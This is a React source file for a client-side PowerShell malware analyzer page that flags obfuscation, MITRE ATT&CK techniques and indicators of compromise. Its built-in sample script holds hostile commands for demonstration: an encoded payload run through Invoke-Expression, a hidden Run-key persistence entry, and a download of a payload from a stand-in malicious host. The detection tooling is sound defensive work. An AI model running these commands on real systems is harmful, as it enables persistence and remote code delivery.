import { useCallback, useMemo, useRef, useState } from 'react';
import { BackLink } from '../../components/BackLink';
import {
  ShieldCheck,
  Terminal,
  AlertTriangle,
  Upload,
  FileCode,
  Sparkles,
  Download,
  Copy,
  Check,
  ChevronDown,
  ChevronRight,
} from 'lucide-react';
import {
  analyzePowerShell,
  type AnalysisResult,
  type Finding,
  type Severity,
} from '../../lib/dfir/powershell-analyzer';
import { CopyChip } from '../../components/dfir/CopyButton';

const SAMPLE = `# Sample suspicious script
$encoded = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=='
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Persistence
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "powershell.exe -WindowStyle Hidden -e JABjAGwAaQBlAG4AdAA..."

# Network
Invoke-WebRequest -Uri "http://malicious-domain.ru/payload.ps1" -OutFile "$env:TEMP\\payload.ps1"
`;

const SEVERITY_TONE: Record<Severity, string> = {
  Critical: 'border-rose-500/50 bg-rose-500/15 text-rose-700 dark:text-rose-300',
  High: 'border-orange-500/50 bg-orange-500/15 text-orange-700 dark:text-orange-300',
  Medium: 'border-amber-500/50 bg-amber-500/15 text-amber-700 dark:text-amber-300',
  Low: 'border-slate-400/50 bg-slate-400/10 text-slate-600 dark:text-slate-300',
  Informational: 'border-sky-500/50 bg-sky-500/15 text-sky-700 dark:text-sky-300',
};

const SEVERITY_BAR: Record<Severity, string> = {
  Critical: 'bg-rose-500',
  High: 'bg-orange-500',
  Medium: 'bg-amber-500',
  Low: 'bg-slate-400',
  Informational: 'bg-sky-500',
};

function severityRank(s: Severity): number {
  return { Critical: 0, High: 1, Medium: 2, Low: 3, Informational: 4 }[s];
}

function FindingRow({ f, onJump }: { f: Finding; onJump: (line: number) => void }): JSX.Element {
  const [open, setOpen] = useState(false);
  return (
    <div className="border-b border-slate-200 dark:border-[rgb(var(--border-400))] last:border-b-0">
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        className="w-full flex items-start gap-3 px-3 py-2.5 text-left hover:bg-slate-50 dark:hover:bg-[rgb(var(--surface-300))] transition-colors"
      >
        <span className="mt-0.5 text-slate-400 dark:text-slate-500">
          {open ? <ChevronDown size={14} /> : <ChevronRight size={14} />}
        </span>
        <span className={`shrink-0 px-1.5 py-0.5 text-micro font-mono rounded border ${SEVERITY_TONE[f.severity]}`}>
          {f.severity}
        </span>
        <div className="min-w-0 flex-1">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-sm font-medium text-slate-900 dark:text-slate-100">{f.name}</span>
            <span className="text-micro font-mono text-slate-500 dark:text-slate-400">{f.category}</span>
            <span className="text-micro font-mono text-slate-400">·</span>
            <button
              type="button"
              onClick={(e) => {
                e.stopPropagation();
                onJump(f.line);
              }}
              className="text-micro font-mono text-brand-600 dark:text-brand-400 hover:underline"
            >
              line {f.line}
            </button>
            {f.mitre.map((m) => (
              <span
                key={m}
                className="text-micro font-mono px-1 py-0.5 rounded bg-purple-500/10 text-purple-700 dark:text-purple-300 border border-purple-500/20"
              >
                {m}
              </span>
            ))}
          </div>
          <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">{f.description}</p>
        </div>
        <span className="shrink-0 text-micro font-mono text-slate-400">{f.confidence}</span>
      </button>
      {open && (
        <div className="px-3 pb-3 pl-10 space-y-2">
          <div>
            <span className="text-micro font-mono uppercase tracking-wider text-slate-500 dark:text-slate-400">
              snippet
            </span>
            <pre className="mt-1 text-mini font-mono text-slate-700 dark:text-slate-300 whitespace-pre-wrap break-all bg-slate-50 dark:bg-[rgb(var(--input-200))] rounded p-2 border border-slate-200 dark:border-[rgb(var(--border-400))]">
              {f.snippet}
            </pre>
          </div>
          <div>
            <span className="text-micro font-mono uppercase tracking-wider text-slate-500 dark:text-slate-400">
              recommendation
            </span>
            <p className="text-xs text-slate-600 dark:text-slate-400 mt-0.5">{f.recommendation}</p>
          </div>
        </div>
      )}
    </div>
  );
}

function StatCard({ label, value, tone }: { label: string; value: string | number; tone?: string }): JSX.Element {
  return (
    <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] px-4 py-3">
      <div className={`text-2xl font-display font-bold tabular-nums ${tone ?? 'text-slate-900 dark:text-white'}`}>
        {value}
      </div>
      <div className="mt-0.5 text-micro font-mono uppercase tracking-wider text-slate-500 dark:text-slate-400">
        {label}
      </div>
    </div>
  );
}

export default function PowershellAnalyzer(): JSX.Element {
  const [code, setCode] = useState('');
  const [filename, setFilename] = useState('Pasted Code');
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [analyzing, setAnalyzing] = useState(false);
  const [copied, setCopied] = useState(false);
  const [activeLine, setActiveLine] = useState<number | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const analyze = useCallback(() => {
    if (!code.trim()) return;
    setAnalyzing(true);
    // Defer so the spinner can paint before the (synchronous) scan blocks.
    setTimeout(() => {
      setResult(analyzePowerShell(code));
      setAnalyzing(false);
    }, 50);
  }, [code]);

  const onFile = useCallback((file: File) => {
    if (file.size > 10 * 1024 * 1024) {
      alert('File exceeds 10 MB limit.');
      return;
    }
    const valid = ['.ps1', '.psm1', '.psd1', '.txt'];
    const ext = '.' + file.name.split('.').pop()?.toLowerCase();
    if (!valid.includes(ext)) {
      alert('Invalid file type. Allowed: .ps1, .psm1, .psd1, .txt');
      return;
    }
    const reader = new FileReader();
    reader.onload = (e) => {
      setCode(String(e.target?.result ?? ''));
      setFilename(file.name);
    };
    reader.readAsText(file);
  }, []);

  const sortedFindings = useMemo(
    () => (result ? [...result.findings].sort((a, b) => severityRank(a.severity) - severityRank(b.severity)) : []),
    [result]
  );

  const lines = code.split('\n');
  const findingLines = useMemo(() => new Set(result?.findings.map((f) => f.line) ?? []), [result]);

  const exportJson = useCallback(() => {
    if (!result) return;
    const blob = new Blob(
      [JSON.stringify({ filename, code, result, generatedAt: new Date().toISOString() }, null, 2)],
      {
        type: 'application/json',
      }
    );
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `psa-report-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  }, [result, filename, code]);

  const exportCsv = useCallback(() => {
    if (!result) return;
    const headers = ['ID', 'Severity', 'Category', 'Name', 'Description', 'Line', 'Snippet'];
    const rows = result.findings.map((f) => [
      f.id,
      f.severity,
      f.category,
      f.name,
      `"${f.description.replace(/"/g, '""')}"`,
      f.line,
      `"${f.snippet.replace(/"/g, '""').replace(/\n/g, ' ')}"`,
    ]);
    const csv = [headers.join(','), ...rows.map((r) => r.join(','))].join('\n');
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `psa-findings-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  }, [result]);

  const copyCode = useCallback(() => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  }, [code]);

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-8 py-12 text-slate-900 dark:text-slate-100">
      <BackLink
        to="/dfir"
        className="inline-flex items-center gap-2 text-sm text-muted hover:text-brand-600 dark:hover:text-brand-400 mb-8 font-mono"
      >
        back
      </BackLink>

      <div className="animate-fade-in-up">
        <h1 className="text-3xl sm:text-4xl font-display font-semibold mb-2 flex items-center gap-3">
          <ShieldCheck size={28} className="text-brand-600 dark:text-brand-400" /> PowerShell Security Analyzer
        </h1>
        <p className="text-muted mb-2 leading-relaxed">
          Static analysis of PowerShell scripts for malicious behavior, MITRE ATT&CK techniques, obfuscation, and IOCs —
          without executing the code. 250+ signatures across 13 categories. Ported from{' '}
          <a
            href="https://github.com/nandha2001mroot/powershell-security-analyzer"
            target="_blank"
            rel="noopener noreferrer"
            className="text-brand-600 dark:text-brand-400 hover:underline"
          >
            Nandha Kumar M's PowerShell Security Analyzer
          </a>{' '}
          (MIT).
        </p>
        <p className="text-xs text-slate-500 dark:text-slate-400 font-mono mb-8">
          100% client-side · no execution · no server upload · heuristic results may contain false positives.
        </p>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* ── Input ── */}
          <div className="space-y-4">
            <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] overflow-hidden">
              <div className="flex items-center justify-between px-4 py-2.5 border-b border-slate-200 dark:border-[rgb(var(--border-400))]">
                <span className="text-sm font-mono text-slate-600 dark:text-slate-300 flex items-center gap-2">
                  <Terminal size={14} /> {filename}
                </span>
                <span className="px-1.5 py-0.5 text-micro font-mono rounded border border-emerald-500/40 bg-emerald-500/10 text-emerald-700 dark:text-emerald-300">
                  client-side
                </span>
              </div>
              <textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                placeholder="# Paste PowerShell code here..."
                spellCheck={false}
                className="w-full h-80 px-4 py-3 bg-slate-50 dark:bg-[rgb(var(--input-200))] text-sm font-mono text-slate-900 dark:text-slate-100 border-0 outline-none resize-y"
              />
              <div className="flex items-center gap-2 px-3 py-2.5 border-t border-slate-200 dark:border-[rgb(var(--border-400))]">
                <button
                  type="button"
                  onClick={analyze}
                  disabled={!code.trim() || analyzing}
                  className="inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-brand-600 text-white text-sm font-medium hover:bg-brand-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                >
                  <Sparkles size={14} /> {analyzing ? 'Analyzing…' : 'Analyze'}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setCode(SAMPLE);
                    setFilename('sample_suspicious.ps1');
                  }}
                  className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] text-sm text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-[rgb(var(--surface-300))] transition-colors"
                >
                  <FileCode size={14} /> Sample
                </button>
                <button
                  type="button"
                  onClick={() => fileInputRef.current?.click()}
                  className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] text-sm text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-[rgb(var(--surface-300))] transition-colors"
                >
                  <Upload size={14} /> Upload
                </button>
                <input
                  ref={fileInputRef}
                  type="file"
                  accept=".ps1,.psm1,.psd1,.txt"
                  className="hidden"
                  onChange={(e) => e.target.files?.[0] && onFile(e.target.files[0])}
                />
                <button
                  type="button"
                  onClick={() => {
                    setCode('');
                    setResult(null);
                    setFilename('Pasted Code');
                  }}
                  className="ml-auto text-sm text-slate-500 dark:text-slate-400 hover:text-slate-700 dark:hover:text-slate-200 transition-colors"
                >
                  Clear
                </button>
              </div>
            </div>

            {/* Source viewer with line numbers */}
            {code && (
              <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--input-200))] overflow-hidden">
                <div className="flex items-center justify-between px-4 py-2 border-b border-slate-200 dark:border-[rgb(var(--border-400))]">
                  <span className="text-micro font-mono uppercase tracking-wider text-slate-500 dark:text-slate-400">
                    source · {lines.length} lines
                  </span>
                  <button
                    type="button"
                    onClick={copyCode}
                    className="inline-flex items-center gap-1 text-micro font-mono text-slate-500 dark:text-slate-400 hover:text-brand-600 dark:hover:text-brand-400 transition-colors"
                  >
                    {copied ? <Check size={12} /> : <Copy size={12} />} copy
                  </button>
                </div>
                <div className="max-h-80 overflow-auto">
                  <pre className="text-mini font-mono leading-relaxed">
                    {lines.map((line, i) => {
                      const ln = i + 1;
                      const isFinding = findingLines.has(ln);
                      const isActive = activeLine === ln;
                      return (
                        <div
                          key={i}
                          id={`psa-line-${ln}`}
                          className={`flex ${isActive ? 'bg-brand-500/15' : isFinding ? 'bg-amber-500/10' : ''}`}
                        >
                          <span className="shrink-0 w-12 pr-3 text-right text-slate-400 dark:text-slate-500 select-none border-r border-slate-200 dark:border-[rgb(var(--border-400))] mr-3">
                            {ln}
                          </span>
                          <span className="px-3 text-slate-700 dark:text-slate-300 whitespace-pre-wrap break-all">
                            {line || ' '}
                          </span>
                        </div>
                      );
                    })}
                  </pre>
                </div>
              </div>
            )}
          </div>

          {/* ── Results ── */}
          <div className="space-y-4">
            {!result && (
              <div className="rounded-xl border border-dashed border-slate-300 dark:border-[rgb(var(--border-400))] p-12 text-center">
                <ShieldCheck size={32} className="mx-auto text-slate-400 dark:text-slate-500 mb-3" />
                <p className="text-sm text-slate-500 dark:text-slate-400">
                  Paste a PowerShell script and click <strong>Analyze</strong> to see findings, IOCs, MITRE ATT&CK
                  mapping, and a risk score.
                </p>
              </div>
            )}

            {result && (
              <>
                {/* Risk summary */}
                <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] p-4">
                  <div className="flex items-center justify-between mb-3">
                    <h2 className="text-sm font-display font-bold flex items-center gap-2">
                      <AlertTriangle size={16} className="text-brand-600 dark:text-brand-400" /> Executive Summary
                    </h2>
                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={exportJson}
                        className="inline-flex items-center gap-1 text-micro font-mono text-slate-500 dark:text-slate-400 hover:text-brand-600 dark:hover:text-brand-400 transition-colors"
                      >
                        <Download size={11} /> JSON
                      </button>
                      <button
                        type="button"
                        onClick={exportCsv}
                        className="inline-flex items-center gap-1 text-micro font-mono text-slate-500 dark:text-slate-400 hover:text-brand-600 dark:hover:text-brand-400 transition-colors"
                      >
                        <Download size={11} /> CSV
                      </button>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-4">
                    <StatCard
                      label="Risk Score"
                      value={`${result.risk.riskScore}/100`}
                      tone={
                        result.risk.riskScore >= 80
                          ? 'text-rose-600 dark:text-rose-400'
                          : result.risk.riskScore >= 60
                            ? 'text-orange-600 dark:text-orange-400'
                            : result.risk.riskScore >= 40
                              ? 'text-amber-600 dark:text-amber-400'
                              : 'text-slate-900 dark:text-white'
                      }
                    />
                    <StatCard
                      label="Severity"
                      value={result.risk.severity}
                      tone={
                        result.risk.severity === 'Critical'
                          ? 'text-rose-600 dark:text-rose-400'
                          : result.risk.severity === 'High'
                            ? 'text-orange-600 dark:text-orange-400'
                            : 'text-slate-900 dark:text-white'
                      }
                    />
                    <StatCard label="Malicious %" value={`${result.risk.maliciousScore}%`} />
                    <StatCard label="Confidence" value={result.risk.confidence} />
                  </div>

                  {/* Risk bar */}
                  <div className="mb-3">
                    <div className="h-2 rounded-full bg-slate-200 dark:bg-[rgb(var(--border-400))] overflow-hidden">
                      <div
                        className={`h-full ${SEVERITY_BAR[result.risk.severity]} transition-all`}
                        style={{ width: `${result.risk.riskScore}%` }}
                      />
                    </div>
                  </div>

                  <p className="text-sm text-slate-600 dark:text-slate-400 leading-relaxed">{result.summary}</p>

                  <div className="flex flex-wrap gap-1.5 mt-3">
                    {result.risk.categories.map((c) => (
                      <span
                        key={c}
                        className="text-micro font-mono px-1.5 py-0.5 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] text-slate-600 dark:text-slate-300"
                      >
                        {c}
                      </span>
                    ))}
                  </div>
                </div>

                {/* Obfuscation */}
                <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] p-4">
                  <h3 className="text-sm font-display font-bold mb-2">Obfuscation Analysis</h3>
                  <div className="flex items-center gap-3 mb-2">
                    <div className="flex-1 h-2 rounded-full bg-slate-200 dark:bg-[rgb(var(--border-400))] overflow-hidden">
                      <div
                        className="h-full bg-sky-500 transition-all"
                        style={{ width: `${result.obfuscation.score}%` }}
                      />
                    </div>
                    <span className="text-sm font-mono tabular-nums text-slate-600 dark:text-slate-300">
                      {result.obfuscation.score}/100
                    </span>
                  </div>
                  <ul className="space-y-1">
                    {result.obfuscation.reasons.map((r, i) => (
                      <li key={i} className="text-xs text-slate-500 dark:text-slate-400 flex items-start gap-1.5">
                        <span className="text-slate-400 mt-0.5">•</span>
                        {r}
                      </li>
                    ))}
                  </ul>
                </div>

                {/* Findings */}
                <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] overflow-hidden">
                  <div className="px-4 py-2.5 border-b border-slate-200 dark:border-[rgb(var(--border-400))] flex items-center justify-between">
                    <h3 className="text-sm font-display font-bold">
                      Findings <span className="text-slate-400">({result.findings.length})</span>
                    </h3>
                  </div>
                  {sortedFindings.length === 0 ? (
                    <p className="px-4 py-6 text-sm text-slate-500 dark:text-slate-400 text-center">
                      No suspicious findings detected.
                    </p>
                  ) : (
                    <div className="max-h-96 overflow-y-auto">
                      {sortedFindings.map((f, i) => (
                        <FindingRow
                          key={`${f.id}-${f.line}-${i}`}
                          f={f}
                          onJump={(ln) => {
                            setActiveLine(ln);
                            document
                              .getElementById(`psa-line-${ln}`)
                              ?.scrollIntoView({ behavior: 'smooth', block: 'center' });
                          }}
                        />
                      ))}
                    </div>
                  )}
                </div>

                {/* MITRE ATT&CK */}
                {Object.keys(result.mitreMap).length > 0 && (
                  <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] overflow-hidden">
                    <div className="px-4 py-2.5 border-b border-slate-200 dark:border-[rgb(var(--border-400))]">
                      <h3 className="text-sm font-display font-bold">
                        MITRE ATT&CK <span className="text-slate-400">({Object.keys(result.mitreMap).length})</span>
                      </h3>
                    </div>
                    <div className="divide-y divide-slate-200 dark:divide-[rgb(var(--border-400))]">
                      {Object.entries(result.mitreMap)
                        .sort(([a], [b]) => a.localeCompare(b))
                        .map(([id, info]) => (
                          <div key={id} className="px-4 py-2.5">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className="text-micro font-mono px-1.5 py-0.5 rounded bg-purple-500/10 text-purple-700 dark:text-purple-300 border border-purple-500/20">
                                {id}
                              </span>
                              <span className="text-xs text-slate-600 dark:text-slate-300">{info.technique}</span>
                              <span className="text-micro font-mono text-slate-400">· {info.tactic}</span>
                            </div>
                            <div className="mt-1 flex flex-wrap gap-1">
                              {info.findings.map((fn) => (
                                <span key={fn} className="text-micro text-slate-500 dark:text-slate-400">
                                  {fn}
                                </span>
                              ))}
                            </div>
                          </div>
                        ))}
                    </div>
                  </div>
                )}

                {/* IOCs */}
                {result.iocs.length > 0 && (
                  <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] overflow-hidden">
                    <div className="px-4 py-2.5 border-b border-slate-200 dark:border-[rgb(var(--border-400))]">
                      <h3 className="text-sm font-display font-bold">
                        Indicators of Compromise <span className="text-slate-400">({result.iocs.length})</span>
                      </h3>
                    </div>
                    <div className="divide-y divide-slate-200 dark:divide-[rgb(var(--border-400))]">
                      {result.iocs.map((ioc, i) => (
                        <div key={`${ioc.value}-${i}`} className="px-4 py-2 flex items-center gap-3">
                          <span className="shrink-0 text-micro font-mono px-1.5 py-0.5 rounded bg-sky-500/10 text-sky-700 dark:text-sky-300 border border-sky-500/20">
                            {ioc.type}
                          </span>
                          <code className="flex-1 text-xs font-mono text-slate-700 dark:text-slate-300 break-all">
                            {ioc.value}
                          </code>
                          <span className="shrink-0 text-micro font-mono text-slate-400">L{ioc.line}</span>
                          <CopyChip value={ioc.value} title="Copy IOC" />
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
